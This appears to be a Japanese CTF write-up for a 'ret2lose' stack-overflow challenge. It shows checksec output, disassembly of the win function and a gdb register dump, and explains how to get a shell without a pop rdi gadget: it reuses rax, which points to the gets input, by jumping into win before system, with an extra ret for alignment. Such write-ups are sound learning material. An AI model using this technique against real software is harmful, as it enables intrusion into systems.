```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, [中略] , not stripped

$ pwn checksec vuln
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

このチャレンジはret2winとret2loseで共通の問題になっている。ghidraで見てみるとgetsでスタックオーバーフローするいつものパターン。

ret2winはr、eturnアドレスの位置にwin関数のアドレスを書き込めばいいだけなので省略する。それにloseの方でシェルを取るので、そこでwinのフラグを取ってしまってもいい。

## ポイント
今回の問題はpop rdi; ret;ガジェットが存在しないので多少捻る必要があった。
注目したのはwin関数にあるsystem前のアセンブリと、getsの返り値(raxの値)の2点。

以下を見ていただきたい。
```
000000000040117a <win>:
  40117a:	f3 0f 1e fa          	endbr64 
  40117e:	55                   	push   rbp
  40117f:	48 89 e5             	mov    rbp,rsp
  401182:	48 8d 05 7b 0e 00 00 	lea    rax,[rip+0xe7b]        # 402004 <_IO_stdin_used+0x4>
  401189:	48 89 c7             	mov    rdi,rax
  40118c:	b8 00 00 00 00       	mov    eax,0x0
  401191:	e8 ba fe ff ff       	call   401050 <system@plt>
  401196:	90                   	nop
  401197:	5d                   	pop    rbp
  401198:	c3                   	ret  
```
system("/bin/sh")を実行するには、rdiに/bin/shのアドレスを入れる必要がある。今回はpop rdiがないのでROPは選択肢から外れる。そこでgetsが登場する。以下はgets実行後のgdb。
```
$rax   : 0x007ffc866a0760  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rbx   : 0x0
$rcx   : 0x007f79adc72aa0  →  0x00000000fbad2088
$rdx   : 0x1
$rsp   : 0x007ffc866a0760  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rbp   : 0x007ffc866a07a0  →  0x6161616161616161 ("aaaaaaaa"?)
$rsi   : 0x1
$rdi   : 0x007f79adc74a80  →  0x0000000000000000
$rip   : 0x00000000401173  →  <main+29> mov eax, 0x0
$r8    : 0x0
$r9    : 0x0
$r10   : 0x77
$r11   : 0x246
$r12   : 0x007ffc866a08b8  →  0x007ffc866a1465  →  0x53006e6c75762f2e ("./vuln"?)
$r13   : 0x00000000401156  →  <main+0> endbr64
$r14   : 0x00000000403e18  →  0x00000000401120  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007f79adcca040  →  0x007f79adccb2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───── stack ────
0x007ffc866a0760│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"      ← $rax, $rsp
0x007ffc866a0768│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
0x007ffc866a0770│+0x0010: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
0x007ffc866a0778│+0x0018: 0x6161616161616161
0x007ffc866a0780│+0x0020: 0x6161616161616161
0x007ffc866a0788│+0x0028: 0x6161616161616161
0x007ffc866a0790│+0x0030: 0x6161616161616161
0x007ffc866a0798│+0x0038: 0x6161616161616161
──── code:x86:64 ────
     0x401166 <main+16>        mov    rdi, rax
     0x401169 <main+19>        mov    eax, 0x0
     0x40116e <main+24>        call   0x401060 <gets@plt>
 →   0x401173 <main+29>        mov    eax, 0x0
```
raxがちょうど入力したアドレスを指している。このraxを保持したまま、win関数の0x401189に飛べばシェルを実行できる。

ちなみにsolverにはretを一回挟んでいる。これはsystem実行時にSIGSEGVが発生したので、それを防ぐためにいれた。
